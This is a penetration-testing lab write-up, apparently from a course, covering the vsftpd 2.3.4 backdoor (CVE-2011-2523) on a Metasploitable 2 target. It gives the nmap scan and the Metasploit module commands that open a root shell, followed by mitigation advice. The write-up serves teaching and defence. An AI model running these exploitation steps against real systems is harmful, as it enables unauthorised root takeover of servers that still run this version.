# Lab 03: VSFTPD 2.3.4 Backdoor Exploitation

## Overview
This lab demonstrates the exploitation of a known backdoor vulnerability in **vsftpd version 2.3.4** on the Metasploitable 2 machine.  
The objective is to identify the vulnerable service, exploit it using Metasploit, and gain root-level access.

---

## Lab Environment

| Component | Details |
|---------|--------|
| Attacker | Kali Linux |
| Target | Metasploitable 2 |
| Network | Internal Network |
| Tooling | Nmap, Metasploit Framework |

---

## Reconnaissance

### Service Enumeration
Initial port and service scanning was performed using Nmap:

```bash
nmap -sV -p 21 192.168.56.103
```

**Result:**
-FTP service detected
-Version identified as vsftpd 2.3.4
-This version is known to contain a malicious backdoor introduced in the official source code.

## Vulnerability Identification
CVE: CVE-2011-2523
-Service: FTP
-Software: vsftpd
-Version: 2.3.4

## Vulnerability Type: Backdoor / Command Execution
Impact: Remote root shell access
Exploit Availability: Public (Metasploit)
Note: Not all FTP servers are vulnerable. This exploit only works against the specific compromised version.

### Exploitation
Metasploit Module Used
```
-exploit/unix/ftp/vsftpd_234_backdoor
```
Exploitation Stepsmsfconsole
```
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.56.103
-run
```

### Post-Exploitation
Upon successful exploitation, a command shell session was opened.
### Privilege Verification
-whoami
Output:
-root
System Information
-uname -a
Confirmed full system compromise with root privileges.

## Proof of Compromise
-Root shell access obtained
-Ability to read sensitive files (e.g. /etc/passwd)
-Full control over the target system

## Security Impact
This vulnerability allows:
-Unauthenticated remote access
-Immediate root-level compromise
-Complete system takeover
Such vulnerabilities highlight the risk of running outdated or compromised software versions.

## Mitigation Recommendations
-Immediately upgrade vsftpd to a patched and verified version
-Restrict FTP access or disable it if not required
-Monitor services for unexpected behavior
-Apply regular security updates

## Conclusion
This lab demonstrates that:
-Exploitable services can be identified through proper enumeration
-Known vulnerabilities can lead to full system compromise
-Exploitability depends on specific versions, not just services
-Exploitable does not mean secure, and non-exploitable does not mean safe.
Proper assessment requires enumeration, verification, and contextual analysis.

## References
-https://www.exploit-db.com/exploits/17491
-https://docs.metasploit.com/

